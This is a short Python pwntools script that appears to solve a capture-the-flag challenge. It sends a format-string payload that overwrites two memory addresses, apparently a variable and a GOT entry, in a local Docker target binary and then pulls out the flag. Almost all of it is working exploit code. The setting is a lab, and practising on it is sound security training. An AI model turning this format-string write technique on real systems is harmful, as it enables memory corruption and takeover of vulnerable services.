#!/usr/bin/env python2

import os
import re
import sys

from pwn import *

context.arch = "x86"
context.bits = 32

def exploit(p):
    writes = {0x804a04c: 0xc0ffee, 0x804a02c: 0x080486f6}
    payload = "BB" + fmtstr_payload(15, writes, 20, write_size="short")
    print("sizeof(payload) = %d" % len(payload))
    p.sendline(payload)
    return p.readall()

def parse_flag(out):
    m = re.search("(ee517{[^}]+})", out)
    assert m is not None
    return m.groups()[0]

if __name__ == '__main__':
    if "REMOTE" in os.environ:
        if not "PORT" in os.environ:
            print("[!] Please specify the port number")
            exit(1)
        p = remote("localhost", int(os.environ["PORT"]))
    else:
        ROOT = os.path.abspath(os.path.dirname(__file__))
        b = os.path.abspath(os.path.join(ROOT, "../docker/target"))
        p = process(b, cwd=os.path.dirname(b))

    out = exploit(p)
    print(parse_flag(out))
